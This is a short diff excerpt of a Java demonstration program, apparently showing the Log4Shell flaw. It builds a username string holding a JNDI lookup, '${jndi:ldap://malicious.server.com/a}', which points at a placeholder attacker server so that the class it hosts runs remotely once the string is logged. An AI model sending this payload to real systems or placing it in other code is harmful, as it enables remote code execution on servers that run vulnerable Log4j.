@@ -19,6 +19,7 @@ public class Main {
         // The URL 'ldap://malicious.server.com/a' is a placeholder
         // for an attacker-controlled server that hosts a malicious Java class
         // to be executed remotely.
+
         String maliciousUsername = "${jndi:ldap://malicious.server.com/a}";
 
         // --- 2. Logging the Malicious Input ---
